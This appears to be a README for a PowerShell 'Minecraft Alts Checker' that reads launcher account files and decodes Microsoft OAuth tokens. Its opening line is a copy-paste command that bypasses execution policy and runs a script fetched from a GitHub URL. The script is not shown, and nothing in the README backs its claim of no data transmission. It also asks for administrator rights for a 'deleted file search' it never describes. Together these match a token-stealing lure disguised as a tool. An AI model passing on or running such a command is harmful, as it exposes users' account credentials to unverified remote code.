- **`powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/OnlyDehBest/alts-checker/main/alt-checker_v2.ps1')"`**

**🛠️ Minecraft Alts Checker Tool**
A PowerShell utility for analyzing Minecraft accounts stored locally by various launchers, with JWT token decoding capabilities.

🔍 **Features**

 - **Account Analysis**
   - View locally stored Minecraft accounts from:
      - TLauncher
      - Official Minecraft Launcher
   - Detect Microsoft OAuth tokens (`accessToken/id_token`)
   - JWT token decoding with claims inspection

 - **Forensic Capabilities**
   - Parses these key files:
      - `%APPDATA%\.minecraft\TlauncherProfiles.json`
      - `%APPDATA%\.minecraft\launcher_accounts.json`
      - `%APPDATA%\.minecraft\usernamecache.json`
      - `%APPDATA%\.minecraft\usercache.json`

📋 **Account Information Display**

 - For each found account, shows:
   - Username
   - UUID
   - Account type
   - Microsoft token presence (✅/❌)
   - Decoded JWT claims (when available)

🔐 **JWT Decoding**

 - The built-in Decode-Jwt function:
   - Accepts JWT tokens (`accessToken or id_token`)
   - Splits and base64-decodes the payload
   - Returns readable JSON claims in table format

⚠️ **Requirements**

 - Windows PowerShell 5.1+
 - Administrative privileges (for deleted file search)
 - Minecraft/TLauncher installation

📜 **Legal Notice**

 - This tool is intended solely for personal use and debugging purposes. It must not be used to:
   - Violate any terms of service
   - Access unauthorized accounts
   - Conduct illegal activities
 - **The author disclaims all responsibility for misuse of this software.**

🛡️ **Security Note**

 - The script:
   - Runs locally without external data transmission
   - Requests minimal necessary permissions
   - Provides transparent account inspection

***`Not affiliated with Mojang Studios or Microsoft. Minecraft is a trademark of Mojang Studios.`***
